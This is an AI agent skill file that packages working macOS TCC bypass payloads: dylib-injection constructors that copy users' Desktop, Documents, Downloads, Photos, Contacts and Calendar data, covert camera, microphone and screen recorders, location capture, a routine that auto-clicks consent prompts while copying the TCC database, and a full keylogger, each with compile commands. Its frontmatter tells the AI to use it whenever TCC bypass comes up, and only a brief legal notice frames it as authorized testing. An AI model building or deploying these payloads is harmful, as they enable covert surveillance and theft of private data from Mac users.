---
name: macos-tcc-payloads
description: macOS TCC (Transparency, Consent, and Control) security testing payloads. Use this skill when testing macOS security controls, auditing TCC permissions, or researching macOS privacy protections. Covers Desktop, Documents, Downloads, Photos, Contacts, Calendar, Camera, Microphone, Location, Screen Recording, and Accessibility TCC services with Objective-C and shell payloads. Make sure to use this skill whenever the user mentions macOS security testing, TCC bypass, privacy permission auditing, or needs to test access to protected macOS resources.
---

# macOS TCC Payloads

A collection of security testing payloads for macOS TCC (Transparency, Consent, and Control) services. Use these for **authorized security assessments and penetration testing only**.

## Overview

macOS TCC controls access to sensitive user data and system resources. This skill provides payloads to test various TCC services. Each service has:
- **Entitlement**: Required app entitlement (if any)
- **TCC Service**: The TCC database key
- **Objective-C Payload**: For dylib injection scenarios
- **Shell Payload**: For direct testing

## Quick Reference

| Service | TCC Key | Entitlement |
|---------|---------|-------------|
| Desktop | kTCCServiceSystemPolicyDesktopFolder | None |
| Documents | kTCCServiceSystemPolicyDocumentsFolder | None |
| Downloads | kTCCServiceSystemPolicyDownloadsFolder | None |
| Photos | kTCCServicePhotos | com.apple.security.personal-information.photos-library |
| Contacts | kTCCServiceAddressBook | com.apple.security.personal-information.addressbook |
| Calendar | kTCCServiceCalendar | com.apple.security.personal-information.calendars |
| Camera | kTCCServiceCamera | com.apple.security.device.camera |
| Microphone | kTCCServiceMicrophone | com.apple.security.device.audio-input |
| Location | kTCCServiceLocation | com.apple.security.personal-information.location |
| Screen Recording | kTCCServiceScreenCapture | None |
| Accessibility | kTCCServiceAccessibility | None |

## Usage

### 1. Check TCC Status

Use the helper script to check current TCC permissions:

```bash
./scripts/check-tcc-status.sh
```

### 2. Compile Objective-C Payloads

Use the compilation helper:

```bash
./scripts/compile-payload.sh <payload-name>
```

Available payloads:
- `desktop`, `documents`, `downloads` - File access
- `photos`, `contacts`, `calendar` - Personal info
- `camera-record`, `camera-check` - Camera access
- `mic-record`, `mic-check` - Microphone access
- `location` - Location services
- `screen-record` - Screen capture
- `accessibility-accept`, `accessibility-keylogger` - Accessibility

### 3. Run Shell Payloads

Shell payloads can be run directly. See individual sections below.

---

## Desktop Folder

- **Entitlement**: None
- **TCC**: kTCCServiceSystemPolicyDesktopFolder

### Objective-C

```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr);
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    NSString *desktopPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Desktop"];
    NSString *tmpPath = @"/tmp/desktop";
    
    if (![fileManager copyItemAtPath:desktopPath toPath:tmpPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }
    NSLog(@"Copy completed successfully.");
    fclose(stderr);
}
```

**Compile**: `gcc -dynamiclib -framework Foundation -o /tmp/desktop.dylib /tmp/desktop.m`

### Shell

```bash
cp -r "$HOME/Desktop" "/tmp/desktop"
```

---

## Documents Folder

- **Entitlement**: None
- **TCC**: kTCCServiceSystemPolicyDocumentsFolder

### Objective-C

```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr);
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    NSString *docsPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    NSString *tmpPath = @"/tmp/documents";
    
    if (![fileManager copyItemAtPath:docsPath toPath:tmpPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }
    NSLog(@"Copy completed successfully.");
    fclose(stderr);
}
```

**Compile**: `gcc -dynamiclib -framework Foundation -o /tmp/documents.dylib /tmp/documents.m`

### Shell

```bash
cp -r "$HOME/Documents" "/tmp/documents"
```

---

## Downloads Folder

- **Entitlement**: None
- **TCC**: kTCCServiceSystemPolicyDownloadsFolder

### Objective-C

```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr);
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    NSString *downloadsPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Downloads"];
    NSString *tmpPath = @"/tmp/downloads";
    
    if (![fileManager copyItemAtPath:downloadsPath toPath:tmpPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }
    NSLog(@"Copy completed successfully.");
    fclose(stderr);
}
```

**Compile**: `gcc -dynamiclib -framework Foundation -o /tmp/downloads.dylib /tmp/downloads.m`

### Shell

```bash
cp -r "$HOME/Downloads" "/tmp/downloads"
```

---

## Photos Library

- **Entitlement**: com.apple.security.personal-information.photos-library
- **TCC**: kTCCServicePhotos

### Objective-C

```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr);
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    NSString *photosPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Pictures/Photos Library.photoslibrary"];
    NSString *tmpPath = @"/tmp/photos";
    
    if (![fileManager copyItemAtPath:photosPath toPath:tmpPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }
    NSLog(@"Copy completed successfully.");
    fclose(stderr);
}
```

**Compile**: `gcc -dynamiclib -framework Foundation -o /tmp/photos.dylib /tmp/photos.m`

### Shell

```bash
cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
```

---

## Contacts

- **Entitlement**: com.apple.security.personal-information.addressbook
- **TCC**: kTCCServiceAddressBook

### Objective-C

```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr);
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    NSString *contactsPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Application Support/AddressBook"];
    NSString *tmpPath = @"/tmp/contacts";
    
    if (![fileManager copyItemAtPath:contactsPath toPath:tmpPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }
    NSLog(@"Copy completed successfully.");
    fclose(stderr);
}
```

**Compile**: `gcc -dynamiclib -framework Foundation -o /tmp/contacts.dylib /tmp/contacts.m`

### Shell

```bash
cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
```

---

## Calendar

- **Entitlement**: com.apple.security.personal-information.calendars
- **TCC**: kTCCServiceCalendar

### Objective-C

```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr);
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    NSString *calendarPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Calendars/"];
    NSString *tmpPath = @"/tmp/calendars";
    
    if (![fileManager copyItemAtPath:calendarPath toPath:tmpPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }
    NSLog(@"Copy completed successfully.");
    fclose(stderr);
}
```

**Compile**: `gcc -dynamiclib -framework Foundation -o /tmp/calendar.dylib /tmp/calendar.m`

### Shell

```bash
cp -r "$HOME/Library/Calendars" "/tmp/calendars"
```

---

## Camera

- **Entitlement**: com.apple.security.device.camera
- **TCC**: kTCCServiceCamera

### Record Video (Objective-C)

```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

@interface VideoRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>
@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;
- (void)startRecording;
- (void)stopRecording;
@end

@implementation VideoRecorder
- (instancetype)init {
    self = [super init];
    if (self) { [self setupCaptureSession]; }
    return self;
}
- (void)setupCaptureSession {
    self.captureSession = [[AVCaptureSession alloc] init];
    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
    AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
    NSError *error;
    self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&error];
    if (error) { NSLog(@"Error: %@", [error localizedDescription]); return; }
    if ([self.captureSession canAddInput:self.videoDeviceInput]) {
        [self.captureSession addInput:self.videoDeviceInput];
    }
    self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];
    if ([self.captureSession canAddOutput:self.movieFileOutput]) {
        [self.captureSession addOutput:self.movieFileOutput];
    }
}
- (void)startRecording {
    [self.captureSession startRunning];
    NSURL *outputFileURL = [NSURL fileURLWithPath:@"/tmp/recording.mov"];
    [self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
    NSLog(@"Recording started");
}
- (void)stopRecording {
    [self.movieFileOutput stopRecording];
    [self.captureSession stopRunning];
    NSLog(@"Recording stopped");
}
- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
      fromConnections:(NSArray<AVCaptureConnection *> *)connections
                error:(NSError *)error {
    if (error) { NSLog(@"Recording failed: %@", [error localizedDescription]); }
    else { NSLog(@"Recording saved to %@", outputFileURL.path); }
}
@end

__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {
    freopen("/tmp/logs.txt", "a", stderr);
    VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];
    [videoRecorder startRecording];
    [NSThread sleepForTimeInterval:3.0];
    [videoRecorder stopRecording];
    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:3.0]];
    fclose(stderr);
}
```

**Compile**: `gcc -framework Foundation -framework AVFoundation -dynamiclib /tmp/camera-record.m -o /tmp/camera-record.dylib`

### Check Access (Objective-C)

```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

@interface CameraAccessChecker : NSObject
+ (BOOL)hasCameraAccess;
@end

@implementation CameraAccessChecker
+ (BOOL)hasCameraAccess {
    AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
    if (status == AVAuthorizationStatusAuthorized) {
        NSLog(@"[+] Access to camera granted.");
        return YES;
    } else {
        NSLog(@"[-] Access to camera denied.");
        return NO;
    }
}
@end

__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {
    freopen("/tmp/logs.txt", "a", stderr);
    [CameraAccessChecker hasCameraAccess];
    fclose(stderr);
}
```

**Compile**: `gcc -framework Foundation -framework AVFoundation -dynamiclib /tmp/camera-check.m -o /tmp/camera-check.dylib`

### Shell

```bash
# Take a photo
ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
```

---

## Microphone

- **Entitlement**: com.apple.security.device.audio-input
- **TCC**: kTCCServiceMicrophone

### Record Audio (Objective-C)

```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

@interface AudioRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>
@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *audioDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *audioFileOutput;
- (void)startRecording;
- (void)stopRecording;
@end

@implementation AudioRecorder
- (instancetype)init {
    self = [super init];
    if (self) { [self setupCaptureSession]; }
    return self;
}
- (void)setupCaptureSession {
    self.captureSession = [[AVCaptureSession alloc] init];
    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
    AVCaptureDevice *audioDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeAudio];
    NSError *error;
    self.audioDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:audioDevice error:&error];
    if (error) { NSLog(@"Error: %@", [error localizedDescription]); return; }
    if ([self.captureSession canAddInput:self.audioDeviceInput]) {
        [self.captureSession addInput:self.audioDeviceInput];
    }
    self.audioFileOutput = [[AVCaptureMovieFileOutput alloc] init];
    if ([self.captureSession canAddOutput:self.audioFileOutput]) {
        [self.captureSession addOutput:self.audioFileOutput];
    }
}
- (void)startRecording {
    [self.captureSession startRunning];
    NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"recording.m4a"];
    NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
    [self.audioFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
    NSLog(@"Recording started");
}
- (void)stopRecording {
    [self.audioFileOutput stopRecording];
    [self.captureSession stopRunning];
    NSLog(@"Recording stopped");
}
- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
      fromConnections:(NSArray<AVCaptureConnection *> *)connections
                error:(NSError *)error {
    if (error) { NSLog(@"Recording failed: %@", [error localizedDescription]); }
    else { NSLog(@"Recording saved to %@", outputFileURL.path); }
}
@end

__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {
    freopen("/tmp/logs.txt", "a", stderr);
    AudioRecorder *audioRecorder = [[AudioRecorder alloc] init];
    [audioRecorder startRecording];
    [NSThread sleepForTimeInterval:5.0];
    [audioRecorder stopRecording];
    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
    fclose(stderr);
}
```

**Compile**: `gcc -dynamiclib -framework Foundation -framework AVFoundation /tmp/mic-record.m -o /tmp/mic-record.dylib`

### Check Access (Objective-C)

```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

@interface MicrophoneAccessChecker : NSObject
+ (BOOL)hasMicrophoneAccess;
@end

@implementation MicrophoneAccessChecker
+ (BOOL)hasMicrophoneAccess {
    AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio];
    if (status == AVAuthorizationStatusAuthorized) {
        NSLog(@"[+] Access to microphone granted.");
        return YES;
    } else {
        NSLog(@"[-] Access to microphone denied.");
        return NO;
    }
}
@end

__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {
    [MicrophoneAccessChecker hasMicrophoneAccess];
}
```

**Compile**: `gcc -framework Foundation -framework AVFoundation -dynamiclib /tmp/mic-check.m -o /tmp/mic-check.dylib`

### Shell

```bash
# List available microphones
ffmpeg -f avfoundation -list_devices true -i ""
# Record 5 seconds (replace :1 with your device index)
ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
```

---

## Location

- **Entitlement**: com.apple.security.personal-information.location
- **TCC**: Granted in /var/db/locationd/clients.plist

> **Note**: Location Services must be enabled in Privacy & Security settings.

### Objective-C

```objectivec
#include <syslog.h>
#include <stdio.h>
#import <Foundation/Foundation.h>
#import <CoreLocation/CoreLocation.h>

@interface LocationManagerDelegate : NSObject <CLLocationManagerDelegate>
@end

@implementation LocationManagerDelegate
- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
    CLLocation *location = [locations lastObject];
    NSLog(@"Current location: %@", location);
    exit(0);
}
- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error {
    NSLog(@"Error getting location: %@", error);
    exit(1);
}
@end

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr);
    NSLog(@"Getting location");
    CLLocationManager *locationManager = [[CLLocationManager alloc] init];
    LocationManagerDelegate *delegate = [[LocationManagerDelegate alloc] init];
    locationManager.delegate = delegate;
    [locationManager requestWhenInUseAuthorization];
    [locationManager startUpdatingLocation];
    NSRunLoop *runLoop = [NSRunLoop currentRunLoop];
    while (true) {
        [runLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
    }
    fclose(stderr);
}
```

**Compile**: `gcc -dynamiclib -framework Foundation -framework CoreLocation /tmp/location.m -o /tmp/location.dylib`

---

## Screen Recording

- **Entitlement**: None
- **TCC**: kTCCServiceScreenCapture

### Objective-C

```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

@interface MyRecordingDelegate : NSObject <AVCaptureFileOutputRecordingDelegate>
@end

@implementation MyRecordingDelegate
- (void)captureOutput:(AVCaptureFileOutput *)output
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
fromConnections:(NSArray *)connections
error:(NSError *)error {
    if (error) { NSLog(@"Recording error: %@", error); }
    else { NSLog(@"Recording finished successfully."); }
    exit(0);
}
@end

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr);
    AVCaptureSession *captureSession = [[AVCaptureSession alloc] init];
    AVCaptureScreenInput *screenInput = [[AVCaptureScreenInput alloc] initWithDisplayID:CGMainDisplayID()];
    if ([captureSession canAddInput:screenInput]) {
        [captureSession addInput:screenInput];
    }
    AVCaptureMovieFileOutput *fileOutput = [[AVCaptureMovieFileOutput alloc] init];
    if ([captureSession canAddOutput:fileOutput]) {
        [captureSession addOutput:fileOutput];
    }
    [captureSession startRunning];
    MyRecordingDelegate *delegate = [[MyRecordingDelegate alloc] init];
    [fileOutput startRecordingToOutputFileURL:[NSURL fileURLWithPath:@"/tmp/screen.mov"] recordingDelegate:delegate];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        [fileOutput stopRecording];
    });
    CFRunLoopRun();
    fclose(stderr);
}
```

**Compile**: `clang -framework Foundation -framework AVFoundation -framework CoreVideo -framework CoreMedia -framework CoreGraphics /tmp/screen-record.m -o /tmp/screen-record.dylib`

### Shell

```bash
# Record main screen for 5 seconds
screencapture -V 5 /tmp/screen.mov
```

---

## Accessibility

- **Entitlement**: None
- **TCC**: kTCCServiceAccessibility

> **Warning**: Accessibility is a very powerful permission. It can be abused for keystroke logging and automated UI control.

### Accept TCC Prompt (Objective-C)

```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
#import <OSAKit/OSAKit.h>

void SimulateKeyPress(CGKeyCode keyCode) {
    CGEventRef keyDownEvent = CGEventCreateKeyboardEvent(NULL, keyCode, true);
    CGEventRef keyUpEvent = CGEventCreateKeyboardEvent(NULL, keyCode, false);
    CGEventPost(kCGHIDEventTap, keyDownEvent);
    CGEventPost(kCGHIDEventTap, keyUpEvent);
    if (keyDownEvent) CFRelease(keyDownEvent);
    if (keyUpEvent) CFRelease(keyUpEvent);
}

void RunAppleScript() {
    NSLog(@"Starting AppleScript");
    NSString *scriptSource = @"tell application \"Finder\"\n"
                             @"set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias\n"
                             @"set targetFolder to POSIX file \"/tmp\" as alias\n"
                             @"duplicate file sourceFile to targetFolder with replacing\n"
                             @"end tell\n";
    NSDictionary *errorDict = nil;
    NSAppleScript *appleScript = [[NSAppleScript alloc] initWithSource:scriptSource];
    [appleScript executeAndReturnError:&errorDict];
    if (errorDict) { NSLog(@"AppleScript Error: %@", errorDict); }
}

int main() {
    @autoreleasepool {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            RunAppleScript();
        });
        NSLog(@"Starting key presses");
        for (int i = 0; i < 10; ++i) {
            SimulateKeyPress((CGKeyCode)36); // Enter key
            usleep(100000); // 0.1 seconds
        }
    }
    return 0;
}
```

**Compile**: `clang -framework Foundation -framework ApplicationServices -framework OSAKit /tmp/accessibility-accept.m -o /tmp/accessibility-accept`

### Keylogger (Objective-C)

```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
#import <Carbon/Carbon.h>

NSString *const kKeystrokesLogPath = @"/tmp/keystrokes.txt";

void AppendStringToFile(NSString *str, NSString *filePath) {
    NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:filePath];
    if (fileHandle) {
        [fileHandle seekToEndOfFile];
        [fileHandle writeData:[str dataUsingEncoding:NSUTF8StringEncoding]];
        [fileHandle closeFile];
    } else {
        [str writeToFile:filePath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
}

CGEventRef KeyboardEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type == kCGEventKeyDown) {
        CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        NSString *keyString = nil;
        switch (keyCode) {
            case kVK_Return: keyString = @"<Return>"; break;
            case kVK_Tab: keyString = @"<Tab>"; break;
            case kVK_Space: keyString = @"<Space>"; break;
            case kVK_Delete: keyString = @"<Delete>"; break;
            case kVK_Escape: keyString = @"<Escape>"; break;
            case kVK_Command: keyString = @"<Command>"; break;
            case kVK_Shift: keyString = @"<Shift>"; break;
            case kVK_CapsLock: keyString = @"<CapsLock>"; break;
            case kVK_Option: keyString = @"<Option>"; break;
            case kVK_Control: keyString = @"<Control>"; break;
            default: break;
        }
        if (!keyString) {
            UniCharCount maxStringLength = 4;
            UniCharCount actualStringLength = 0;
            UniChar unicodeString[maxStringLength];
            TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
            CFDataRef layoutData = TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
            const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);
            UInt32 deadKeyState = 0;
            OSStatus status = UCKeyTranslate(keyboardLayout, keyCode, kUCKeyActionDown, 0, LMGetKbdType(),
                                             kUCKeyTranslateNoDeadKeysBit, &deadKeyState, maxStringLength,
                                             &actualStringLength, unicodeString);
            CFRelease(currentKeyboard);
            if (status == noErr && actualStringLength > 0) {
                keyString = [NSString stringWithCharacters:unicodeString length:actualStringLength];
            } else {
                keyString = [NSString stringWithFormat:@"<KeyCode: %d>", keyCode];
            }
        }
        NSString *logString = [NSString stringWithFormat:@"%@\n", keyString];
        AppendStringToFile(logString, kKeystrokesLogPath);
    }
    return event;
}

int main() {
    @autoreleasepool {
        CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
        CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, KeyboardEventCallback, NULL);
        if (!eventTap) { NSLog(@"Failed to create event tap"); exit(1); }
        CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
        CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
        CGEventTapEnable(eventTap, true);
        CFRunLoopRun();
    }
    return 0;
}
```

**Compile**: `clang -framework Foundation -framework ApplicationServices -framework Carbon /tmp/accessibility-keylogger.m -o /tmp/accessibility-keylogger`

---

## Helper Scripts

Use the bundled scripts for common operations:

- `check-tcc-status.sh` - Check current TCC permissions
- `compile-payload.sh` - Compile Objective-C payloads
- `list-tcc-services.sh` - List all TCC service types

---

## Legal Notice

These payloads are for **authorized security testing only**. Ensure you have:
- Written permission from the system owner
- Proper authorization for penetration testing
- Compliance with applicable laws and regulations

Unauthorized use of these techniques may violate computer crime laws.
